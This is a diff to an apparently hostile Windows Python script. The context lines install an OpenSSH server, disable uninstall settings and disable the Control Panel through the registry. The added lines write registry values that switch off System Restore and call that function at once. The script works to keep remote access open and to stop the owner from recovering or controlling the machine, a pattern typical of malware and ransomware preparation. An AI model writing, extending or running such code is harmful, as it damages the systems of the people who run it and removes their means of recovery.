@@ -2,6 +2,7 @@ import os
 import requests
 import time
 import socket
+import winreg
 
 # Install OpenSSH
 os.system('Add-WindowsFeature -Name OpenSSH.Server')
@@ -17,6 +18,21 @@ def disable_uninstall_settings_windows():
 # Call the function to disable uninstall settings in Windows
 disable_uninstall_settings_windows()
 
+def disable_restore_points():
+    reg_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"
+    try:
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "DisableConfig", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "DisableSR", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+        print("Restore points disabled successfully.")
+    except Exception as e:
+        print("An error occurred:", e)
+
+# Call the function to disable restore points
+disable_restore_points()
 
 def disable_control_panel():
     os.system("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f")
